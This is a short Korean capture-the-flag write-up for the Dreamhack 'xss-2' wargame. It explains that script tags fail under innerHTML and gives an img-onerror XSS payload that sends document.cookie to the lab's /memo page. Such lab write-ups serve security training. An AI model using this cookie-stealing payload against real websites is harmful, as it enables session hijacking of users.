# xss-2 (268)

## 문제

https://dreamhack.io/wargame/challenges/268

## 풀이

xss-1 문제와 거의 유사하다.

https://github.com/GwangIl-Park/dreamhack-playground/tree/main/wargame/xss-1

차이가 있다면 vuln 경로에서 innerHTML로 말아서 주기 때문에, \<script>를 사용할 수가 없다.

```
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")
```

따라서 다른 태그가 필요하다.

```
<img src="xx" onerror="location.href=/memo?memo="+document.cookie/>
```

결과는 1과 동일하니 생략